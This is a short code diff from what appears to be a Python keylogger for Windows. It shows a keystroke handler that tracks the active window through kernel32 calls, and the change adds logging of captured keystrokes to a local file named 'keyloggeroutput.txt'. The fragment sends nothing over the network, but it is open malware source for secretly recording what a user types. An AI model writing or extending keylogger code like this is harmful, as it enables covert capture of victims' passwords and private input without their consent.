@@ -35,8 +35,11 @@ def get_current_process():
 	# close the handles
 	kernel32.CloseHandle(hwnd)
 	kernel32.CloseHandle(h_process)
+	
+file_log = 'keyloggeroutput.txt'
 
 def key_stroke(event):
+	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
 	global current_window
 
 	# check if target changed windows
